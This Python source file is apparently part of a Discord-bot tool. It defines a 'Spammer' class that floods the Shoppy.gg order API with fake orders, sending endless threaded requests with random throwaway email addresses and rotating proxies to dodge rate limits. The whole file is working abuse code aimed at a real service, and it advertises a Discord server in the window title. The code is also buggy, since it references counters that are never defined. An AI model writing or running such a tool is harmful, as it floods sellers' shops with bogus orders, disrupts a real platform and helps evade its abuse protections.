import discord, requests, os, random, string, sys
from json import JSONDecodeError
from src.util.logger import Logger
from src.helper.config import Config
from concurrent.futures import ThreadPoolExecutor

# Try to not create .pyc trash files.
sys.dont_write_bytecode = True

class Spammer:
    def __init__(self) -> None:
        self.session = requests.Session()
        self.config = Config()
        self.logger = Logger()
        self.proxies = []
        self.load_proxies()
        self.sent = 0

    def load_proxies(self):
        if not os.path.exists("proxies.txt"):
            self.logger.log("ERROR", "The proxies.txt file doesn't exist. Please add proxies to proxies.txt.")
            exit()
        with open("proxies.txt", "r") as f:
            self.proxies = [line.strip() for line in f]

    def get_random_string(self, length):
        return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

    def call_api(self, proxy_dict, data):
        try:
            response = requests.put('https://shoppy.gg/api/v1/public/order/store', json=data, proxies=proxy_dict)
            response.raise_for_status()
            json_data = response.json()
            order_id = json_data["order"]["id"]
            self.logger.log("OK", f"Sent({response.status_code}) - Order: {order_id}")
            self.sent += 1
        except JSONDecodeError:
            self.logger.log("RATELIMIT", "Ratelimited!")
        except Exception as e:
            self.logger.log("ERROR", f"Error: {e}")

    def send_request(self, product, payment_method):
        while True:
            data = {
                "email": f"{self.get_random_string(10)}@gmail.com",
                "fields": [],
                "gateway": payment_method,
                "product": product,
                "quantity": 1
            }
            proxy = random.choice(self.proxies)
            proxy_dict = {'http': f"http://{proxy}", 'https': f'http://{proxy}'}
            self.call_api(proxy_dict, data)
            os.system(f"title Shoppy.gg Spammer - Sent: {self.sent_count} - Ratelimited: {self.ratelimited_count} - discord.gg/kws")

    def start(self, amount: int, product_id: str, payment_method: str) -> tuple:
        try:
            with ThreadPoolExecutor(max_workers=int(amount)) as executor:
                for _ in range(int(amount)):
                    executor.submit(lambda: self.send_request(product_id, payment_method))
            return True, f"Successfully sent {self.sent} requests to Shoppy.gg!"
        except Exception as e:
            return False, f"Error: {e}"